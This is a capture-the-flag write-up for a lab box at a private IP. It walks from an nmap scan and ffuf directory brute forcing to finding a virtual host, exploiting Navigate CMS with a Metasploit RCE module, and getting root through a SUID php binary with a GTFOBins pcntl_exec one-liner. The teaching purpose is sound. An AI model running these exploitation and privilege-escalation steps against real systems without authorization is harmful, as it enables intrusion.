
IP - 192.168.18.250

## Scanning 

**nmap scan**

```
nmap -A -T4 -p- 192.168.18.250
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-17 15:56 IST
Nmap scan report for 192.168.18.250
Host is up (0.0027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:73:6E:5C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   2.74 ms 192.168.18.250

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.47 seconds
```

**findings:**

- port 22 ssh is open 
- port 80 http is open 
- DNS port 53 is open as well


## Enumeration 

- http://192.168.18.250 is a nginx default page let's try directory brute forcing 
```
ffuf -u http://192.168.18.250/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- **Found paths** 
	- /secret

- At /secret a mocking message 
```
OMG you got r00t !


Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 

```

- When trying to see the source code of the site, we got this info 
```html
<!-- webmaster: alek@blackpearl.tcm -->
```

looks like a **domain name** since 53 is also open we can add that domain to our **/etc/hosts** and see if anything is there http

- Yes we found a php page at **blackpearl.tcm**
- Now let's directory bruteforce **blackpearl.tcm**

```bash
ffuf -u http://blackpearl.tcm/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- **found paths**
	- /navigate -> a login page -> looks like uses navigate CMS 

- Let's try looking for any exploits on **navigate CMS**
- Seems there is a **unauthenticated RCE** in metasploit found in **exploit-db**


## Exploitation 

- Open up metasploit and exploit that **navigate RCE**

```bash
msfconsole 

search navigate

use exploit/multi/http/navigate_cms_rce

set RHOSTS blackpearl.tcm 

exploit

```


we got a initial shell as **www-data**

In home directory there is only one user **alek** and his home directory is empty 

## Priv Escalation 

Let's try to find suid files 

```
find / -perm -u=s -type f 2>/dev/null
```

**/usr/bin/php7.3** has suid bit enabled 

Let's see the **gtfobin** for privesc using **php** 

```
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

so we executed 

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

That gave us root shell 

**flag**

```
cat flag.txt
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
```

